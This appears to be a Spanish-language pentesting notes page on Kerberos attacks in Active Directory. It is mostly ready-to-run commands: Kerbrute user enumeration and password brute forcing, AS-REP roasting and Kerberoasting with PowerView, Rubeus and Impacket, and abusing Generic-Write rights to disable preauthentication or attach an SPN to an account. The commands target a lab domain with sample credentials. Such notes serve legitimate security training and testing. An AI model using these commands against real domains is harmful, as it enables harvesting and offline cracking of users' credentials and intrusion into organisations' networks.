
# Hacking en Kerberos

## <mark style="color:purple;">Kerbrute</mark>

{% embed url="<https://github.com/ropnop/kerbrute>" %}

Kerbrute es una herramienta de prueba de penetración de código abierto escrita en GO que se utiliza para realizar ataques de fuerza bruta contra el protocolo Kerberos en entornos de Active Directory. Kerbrute es capaz de probar miles de contraseñas en cuestión de minutos y puede ser una herramienta efectiva para identificar contraseñas débiles o vulnerabilidades en la configuración de Kerberos.

1. Instalar go:&#x20;

```bash
sudo apt install golang
```

2. Cambiar ruta de archivos go:&#x20;

```csharp
sudo emacs .zshrc
#Al final del todo añadir:
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

```bash
source .zshrc
```

3. Instalación y uso

```bash
go install github.com/ropnop/kerbrute@latest
kerbrute -h
```

### User Enumeration

{% hint style="info" %}
Para que funcione esta técnica tenemos que tener nuestra máquina de atacante en la misma red que el Domain Controller. Se puede hacer desde Ajustes de Red > IP
{% endhint %}

```bash
./kerbrute userenum --dc <IP-Domain-Controller> -d <nombre_de_usuario>
```

### Brute Users

```bash
kerbrute bruteuser -d corp.local passsword.txt empleado1
```

### AS-REQ Roasting

Conseguir el timestamp en la primera petición de AS Request, o la session key cifrada

* Interceptar login con WireShark
* Petición AS-REQ
* Copiar el hash y el salt del Request y la Respuesta
* Unirlo con el formato de Hashcat Wiki: <https://hashcat.net/wiki/doku.php?id=example_hashes>
* john hash.txt

## <mark style="color:purple;">Rubeus</mark>

Rubeus es una herramienta de prueba de penetración de código abierto para entornos de Active Directory que se utiliza para realizar ataques de Kerberos. Rubeus es similar a otras herramientas de ataque de Kerberos como Mimikatz, pero se enfoca en la extracción y manipulación de tickets de Kerberos.

* Descargar .zip del repositorio: <https://github.com/GhostPack/Rubeus>
* Instalar Visual Studio para compilarlo
* Elegir Desarrollo de escritorio de .NET
* Compilar Rubeus

SI no queremos compilar el binario podríamos usar mi repositorio de AD-Tools, en el que ya se incluyen multitud de binarios precompilados, incluído Rubeus:

{% embed url="<https://github.com/afsh4ck/AD-Tools>" %}

## <mark style="color:purple;">AS-REP Roasting</mark>

AS-REP Roasting es una técnica de ataque de Kerberos que se utiliza para obtener contraseñas de usuario en entornos de Active Directory que permiten la autenticación sin cifrado.

### Con Powerview:

```powershell
Get-DomainUser -PreauthNotRequired
```

* Con esto obtenemos todos los usuarios del dominio que tienen en el UAC el permiso de DONT\_REQ\_PREAUTH
* Con solo enviar el nombre de esta persona nos devuelve el ticket granting ticket de esa persona

### Con Rubeus:

```powershell
.\Rubeus.exe asreproast /format:john /outfile:hash.john
```

* En la carpeta Debug nos vuelca el hash en un formato para que john lo crackee

### Si no encontramos usuarios que el permiso DONT\_REQ\_PREAUTH:

* Puede tener la DACL de “Escribir todas las propiedades” en la parte de seguridad (Generic-Write)
* Activar flag de DONT\_REQ\_PREAUTH con PowerView:
* Set-DomainObject -Identity arlinda.kirstin -XOR @{useraccountcontrol=4194304} -Verbose

### Desde Kali Linux:

* Meter Kali en la red del DC en ajustes de red > IP&#x20;
* Snifar tráfico kerberos con Wireshark

```bash
kerbrute userenum -d corp.local users.txt
```

* En WireShark ver la AS-REP, copiar el valor raw, llevar a Kali y crackear

### Con Impacket en Kali:

```bash
impacket-GetNPUsers corp.local/ -users users.txt -format john -outputfile asrep.hash
```

* Si sabemos el usuario y su contraseña:

```bash
impacket-GetNPUsers corp.local/empleado3:Passw0rd3 -format john -outputfile asrepimp.hash
```

## <mark style="color:purple;">Kerberoasting (TGS-REP Roasting)</mark>

Es la interacción con el Ticket Granting Service, para obtener tickets de servicio para los servicios creados por los usuarios para obtener y crackear su clave.

<figure><img src="/files/17lS7lpfl06iRaY6BxzH" alt=""><figcaption><p>Kerberoasting (TGS-REP Roasting)</p></figcaption></figure>

### Ver servicios en una máquina:

Con Powerview:

{% code title="Windows de empleado" %}

```powershell
Get-NetComputer -Identity WS03
```

{% endcode %}

* Ver service principal name

### Crear un usuario de Servicio en el DC:

* <mark style="color:orange;">MailSrvc</mark> (Por ejemplo para servicio de correo)

Asociar a este usuario un host por powershell:

```powershell
setspn -S MailSrvc/MS01.corp.local MailSrvc
```

### Identificar todos los usuarios del dominio que estén ofreciendo un servicio

Con PowerView:

{% code title="Windows de empleado" %}

```powershell
Get-NetUser -SPN
Get-NetUser -SPN | select name, serviceprincipalname
```

{% endcode %}

### Explotar Kerberoasting con Rubeus

{% code title="Windows de empleado" %}

```powershell
. .\Rubeus.exe kerberoast
```

{% endcode %}

* Copiar el hash y cracker offline con John&#x20;

### Explotar Kerberoasting con Impacket en Kali

* Meter Kali en la red del DC en ajustes de red > IP&#x20;

```powershell
impacket-GetUserSPNs corp.local/empleado3:Passw0rd3 -request -outputfile tgsrep.hash
```

### Forzar un DACL de Kerberoasting

{% hint style="warning" %}
Necesitamos un usuario con permisos Generic-Write y Generic-All, en este caso kyla.rey
{% endhint %}

En PowerView:

```powershell
Set-DomainObject -Identity kyla.rey -Set @{serviceprincipalname='putoamo/tusiquevales'} -verbose
```

En las siguientes secciones veremos otras técnicas de Kerberoasting desde hosts Linux y Windows
